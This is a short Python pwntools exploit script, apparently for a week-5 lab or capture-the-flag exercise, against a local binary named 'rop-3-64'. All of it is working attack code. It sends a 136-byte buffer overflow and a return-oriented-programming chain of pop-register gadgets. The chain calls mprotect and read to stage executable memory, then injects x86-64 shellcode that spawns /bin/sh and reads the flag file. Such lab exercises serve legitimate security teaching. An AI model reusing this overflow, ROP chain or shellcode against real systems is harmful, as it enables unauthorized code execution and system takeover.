from pwn import *

shell = 'H1\xc0\xb0l\x0f\x05H\x89\xc7H\x89\xc6H1\xc0\xb0r\x0f\x05H1\xc0PH\xbf//bin/shWH1\xf6H1\xd2H\x89\xe7\xb0;\x0f\x05'
p = process("./rop-3-64")
poprdi = p64(0x0000000000400743) #: pop rdi ; ret
poprdx = p64(0x000000000040064a) #: pop rdx ; nop ; pop rbp ; ret
poprsi = p64(0x0000000000400741) #: pop rsi ; pop r15 ; ret

addr = p64(0x0000000000601060)
addr_p = p64(0x0000000000601000)
memp = p64(0x400520)
read = p64(0x400500)

payload = "A"*136 + poprdi + addr_p + poprsi + p64(0x1000) * 2 + poprdx + p64(0x7)*2 + memp + poprdi + p64(0x0) + poprsi +addr + addr + poprdx + p64(0x100)*2 +read + addr
with open("x", "w") as x:
    x.write(payload)

p.sendline(payload)

p.sendline(shell)
p.sendline("cat /home/labs/week5/rop-3-64/flag")
print p.recv(timeout = 1)
